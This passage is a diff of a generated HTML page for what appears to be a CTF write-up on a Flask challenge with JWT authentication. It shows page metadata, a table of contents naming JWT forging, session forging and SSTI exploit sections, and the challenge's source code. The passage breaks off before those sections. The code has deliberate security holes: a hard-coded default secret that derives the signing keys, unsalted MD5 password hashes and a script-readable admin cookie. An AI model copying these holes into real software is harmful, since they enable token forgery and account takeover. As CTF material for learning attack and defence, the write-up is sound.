@@ -49,12 +49,14 @@
 
   
   <meta property="og:url" content="http://localhost:1313/posts/2025-10-12-qnqsecctf2025/">
+  <meta property="og:description" content="The Challenge # The challenge presented us with a Flask web application that had JWT authentication and an admin panel. The description was cryptic: “The reflection is mine, but the soul feels borrowed” - which, as we’ll see, was a hint about the JWT manipulation we’d need to do.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
 
   
   <meta name="twitter:card" content="summary">
+  <meta name="twitter:description" content="The Challenge # The challenge presented us with a Flask web application that had JWT authentication and an admin panel. The description was cryptic: “The reflection is mine, but the soul feels borrowed” - which, as we’ll see, was a hint about the JWT manipulation we’d need to do.">
 
   
   
@@ -221,7 +223,7 @@
     "name": "",
     "headline": "",
     
-    
+    "abstract": "\u003ch2 class=\u0022relative group\u0022\u003eThe Challenge\n    \u003cdiv id=\u0022the-challenge\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\u0022\u003e\n        \u003ca class=\u0022text-primary-300 dark:text-neutral-700 !no-underline\u0022 href=\u0022#the-challenge\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e\n    \n\u003c\/h2\u003e\n\u003cp\u003eThe challenge presented us with a Flask web application that had JWT authentication and an admin panel. The description was cryptic: \u003cem\u003e\u0026ldquo;The reflection is mine, but the soul feels borrowed\u0026rdquo;\u003c\/em\u003e - which, as we\u0026rsquo;ll see, was a hint about the JWT manipulation we\u0026rsquo;d need to do.\u003c\/p\u003e",
     "inLanguage": "en",
     "url" : "http:\/\/localhost:1313\/posts\/2025-10-12-qnqsecctf2025\/",
     "author" : {
@@ -237,7 +239,7 @@
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "0"
+    "wordCount": "1474"
   }]
   </script>
 
@@ -811,6 +813,8 @@
   
 
   
+    
+  
 
   
 
@@ -830,7 +834,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      
+      <span title="Reading time">7 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
   
@@ -988,6 +992,165 @@
       
       
       
+        <div class="order-first lg:ml-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]">
+            
+              <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#the-challenge">The Challenge</a></li>
+    <li><a href="#initial-reconnaissance">Initial Reconnaissance</a></li>
+    <li><a href="#quick-analysis-of-the-source-code">Quick Analysis of the Source Code</a></li>
+    <li><a href="#forging-the-jwt-token">Forging the JWT Token</a></li>
+    <li><a href="#forging-the-flask-session">Forging the Flask Session</a></li>
+    <li><a href="#the-attack">The Attack</a></li>
+    <li><a href="#the-ssti-exploit">The SSTI Exploit</a></li>
+    <li><a href="#the-complete-exploit">The Complete Exploit</a></li>
+    <li><a href="#key-takeaways">Key Takeaways</a></li>
+    <li><a href="#how-to-fix-this">How to Fix This</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#the-challenge">The Challenge</a></li>
+    <li><a href="#initial-reconnaissance">Initial Reconnaissance</a></li>
+    <li><a href="#quick-analysis-of-the-source-code">Quick Analysis of the Source Code</a></li>
+    <li><a href="#forging-the-jwt-token">Forging the JWT Token</a></li>
+    <li><a href="#forging-the-flask-session">Forging the Flask Session</a></li>
+    <li><a href="#the-attack">The Attack</a></li>
+    <li><a href="#the-ssti-exploit">The SSTI Exploit</a></li>
+    <li><a href="#the-complete-exploit">The Complete Exploit</a></li>
+    <li><a href="#key-takeaways">Key Takeaways</a></li>
+    <li><a href="#how-to-fix-this">How to Fix This</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+<script>
+  (function () {
+    'use strict'
+
+    const SCROLL_OFFSET_RATIO = 0.33
+    const TOC_SELECTOR = '#TableOfContents'
+    const ANCHOR_SELECTOR = '.anchor'
+    const TOC_LINK_SELECTOR = 'a[href^="#"]'
+    const NESTED_LIST_SELECTOR = 'li ul'
+    const ACTIVE_CLASS = 'active'
+    let isJumpingToAnchor = false
+
+    function getActiveAnchorId(anchors, offsetRatio) {
+      const threshold = window.scrollY + window.innerHeight * offsetRatio
+      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
+      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))
+
+      if (isJumpingToAnchor) {
+        for (let i = 0; i < anchors.length; i++) {
+          const anchor = anchors[i]
+          if (!tocIds.has(anchor.id)) continue
+          const top = anchor.getBoundingClientRect().top + window.scrollY
+          if (Math.abs(window.scrollY - top) < 100) {
+            return anchor.id
+          }
+        }
+      }
+
+      for (let i = anchors.length - 1; i >= 0; i--) {
+        const top = anchors[i].getBoundingClientRect().top + window.scrollY
+        if (top <= threshold && tocIds.has(anchors[i].id)) {
+          return anchors[i].id
+        }
+      }
+      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
+    }
+
+    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
+      const activeId = getActiveAnchorId(anchors, scrollOffset)
+      if (!activeId) return
+
+      links.forEach(link => {
+        const isActive = link.getAttribute('href') === `#${activeId}`
+        link.classList.toggle(ACTIVE_CLASS, isActive)
+
+        if (collapseInactive) {
+          const ul = link.closest('li')?.querySelector('ul')
+          if (ul) ul.style.display = isActive ? '' : 'none'
+        }
+      })
+
+      if (collapseInactive) {
+        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
+        let el = activeLink
+        while (el && el !== toc) {
+          if (el.tagName === 'UL') el.style.display = ''
+          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
+          el = el.parentElement
+        }
+      }
+    }
+
+    function initTOC() {
+      const toc = document.querySelector(TOC_SELECTOR)
+      if (!toc) return
+
+      const collapseInactive = false
+      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
+      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]
+
+      if (collapseInactive) {
+        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
+      }
+
+      links.forEach(link => {
+        link.addEventListener('click', () => {
+          isJumpingToAnchor = true
+        })
+      })
+
+      const config = {
+        toc,
+        anchors,
+        links,
+        scrollOffset: SCROLL_OFFSET_RATIO,
+        collapseInactive
+      }
+
+      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
+      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })
+
+      updateTOC(config)
+    }
+
+    document.readyState === 'loading'
+      ? document.addEventListener('DOMContentLoaded', initTOC)
+      : initTOC()
+  })()
+</script>
+
+
+            
+          </div>
+        </div>
+      
 
 
       <div class="min-w-0 min-h-0 max-w-fit">
@@ -995,6 +1158,572 @@
 
         <div class="article-content max-w-prose mb-20">
           
+<h2 class="relative group">The Challenge
+    <div id="the-challenge" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#the-challenge" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>The challenge presented us with a Flask web application that had JWT authentication and an admin panel. The description was cryptic: <em>&ldquo;The reflection is mine, but the soul feels borrowed&rdquo;</em> - which, as we&rsquo;ll see, was a hint about the JWT manipulation we&rsquo;d need to do.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sqlite3
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> secrets
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> md5
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime, timedelta, timezone
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> jwt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Flask, request, render_template, redirect, session,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flash, url_for, g, abort, make_response
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> admin_routes <span style="color:#f92672">import</span> admin_bp,generate_jwt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BASE_DIR <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(__file__))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SECRET_DIR <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(BASE_DIR, <span style="color:#e6db74">&#39;secret&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>FLAG_PATH <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(SECRET_DIR, <span style="color:#e6db74">&#39;flag.txt&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>FLAG_PREFIX <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;QnQsec&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ensure_flag</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>makedirs(SECRET_DIR, exist_ok<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(FLAG_PATH):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(FLAG_PATH, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>FLAG_PREFIX<span style="color:#e6db74">}</span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">{</span>secrets<span style="color:#f92672">.</span>token_hex(<span style="color:#ae81ff">16</span>)<span style="color:#e6db74">}</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ensure_flag()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>base <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;Q_SECRET&#34;</span>, <span style="color:#e6db74">&#34;qnqsec-default&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;SECRET_KEY&#39;</span>] <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1((<span style="color:#e6db74">&#34;pepper:&#34;</span> <span style="color:#f92672">+</span> base)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;JWT_SECRET&#39;</span>] <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256((<span style="color:#e6db74">&#34;jwtpepper:&#34;</span> <span style="color:#f92672">+</span> base)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;JWT_EXPIRES_MIN&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">60</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>register_blueprint(admin_bp)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DB_PATH <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(BASE_DIR, <span style="color:#e6db74">&#39;users.db&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_db</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;db&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> g:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>g<span style="color:#f92672">.</span>db <span style="color:#f92672">=</span> sqlite3<span style="color:#f92672">.</span>connect(DB_PATH, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>g<span style="color:#f92672">.</span>db<span style="color:#f92672">.</span>row_factory <span style="color:#f92672">=</span> sqlite3<span style="color:#f92672">.</span>Row
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> g<span style="color:#f92672">.</span>db
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.teardown_appcontext</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">close_db</span>(_exc):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>db <span style="color:#f92672">=</span> g<span style="color:#f92672">.</span>pop(<span style="color:#e6db74">&#39;db&#39;</span>, <span style="color:#66d9ef">None</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> db <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>db<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">init_db</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> sqlite3<span style="color:#f92672">.</span>connect(DB_PATH, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>) <span style="color:#66d9ef">as</span> db:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>db<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#39;PRAGMA journal_mode=WAL&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>db<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#39;drop table if exists users&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>db<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#39;create table users(username text primary key, password text not null)&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>db<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#39;insert into users values(&#34;flag&#34;, &#34;401b0e20e4ccf7a8df254eac81e269a0&#34;)&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>db<span style="color:#f92672">.</span>commit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(DB_PATH):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>init_db()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;login&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/sign_up&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sign_up</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;GET&#39;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;sign_up.html&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> (request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;username&#39;</span>) <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;password&#39;</span>) <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> username <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> password:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flash(<span style="color:#e6db74">&#39;Missing username or password&#39;</span>, <span style="color:#e6db74">&#39;error&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;sign_up.html&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>db <span style="color:#f92672">=</span> get_db()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>db<span style="color:#f92672">.</span>execute(
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;insert into users values(lower(?), ?)&#39;</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(username, md5(password<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>db<span style="color:#f92672">.</span>commit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flash(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;User </span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74"> created&#39;</span>, <span style="color:#e6db74">&#39;message&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;login&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> sqlite3<span style="color:#f92672">.</span>IntegrityError:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flash(<span style="color:#e6db74">&#39;Username is already registered&#39;</span>, <span style="color:#e6db74">&#39;error&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;sign_up.html&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;GET&#39;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;login.html&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> (request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;username&#39;</span>) <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;password&#39;</span>) <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> username <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> password:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flash(<span style="color:#e6db74">&#39;Missing username or password&#39;</span>, <span style="color:#e6db74">&#39;error&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;login.html&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>db <span style="color:#f92672">=</span> get_db()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>row <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>execute(
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;select username, password from users where username = lower(?) and password = ?&#39;</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(username, md5(password<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>)<span style="color:#f92672">.</span>fetchone()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> row:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">=</span> username<span style="color:#f92672">.</span>title()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>role <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#66d9ef">if</span> username<span style="color:#f92672">.</span>lower() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;flag&#34;</span> <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;user&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> generate_jwt(session[<span style="color:#e6db74">&#39;user&#39;</span>],role,app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;JWT_EXPIRES_MIN&#39;</span>],app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;JWT_SECRET&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>resp <span style="color:#f92672">=</span> make_response(redirect(url_for(<span style="color:#e6db74">&#39;account&#39;</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>resp<span style="color:#f92672">.</span>set_cookie(<span style="color:#e6db74">&#34;admin_jwt&#34;</span>, token, httponly<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, samesite<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Lax&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> resp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flash(<span style="color:#e6db74">&#39;Invalid username or password&#39;</span>, <span style="color:#e6db74">&#39;error&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;login.html&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/logout&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logout</span>():
